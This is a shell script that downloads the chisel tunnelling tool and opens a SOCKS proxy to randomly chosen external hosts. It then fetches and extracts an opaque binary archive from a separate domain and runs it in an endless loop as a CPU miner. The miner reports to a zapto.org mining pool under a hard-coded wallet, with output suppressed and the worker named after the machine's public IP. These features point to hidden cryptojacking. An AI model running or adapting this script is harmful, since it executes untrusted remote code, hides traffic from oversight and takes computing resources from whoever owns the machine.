#!/bin/sh
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Data_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 1`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

sleep 2

wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel

./chisel client -v http://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:80 7777:socks &
sleep 2

curl -x socks5h://127.0.0.1:7777 api.ipify.org

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

wget -q http://greenleaf.teatspray.fun/GP_261.tar.gz >/dev/null

sleep 2

tar -xf GP_261.tar.gz

sleep 2

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

while true
do
./GP --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 10
done
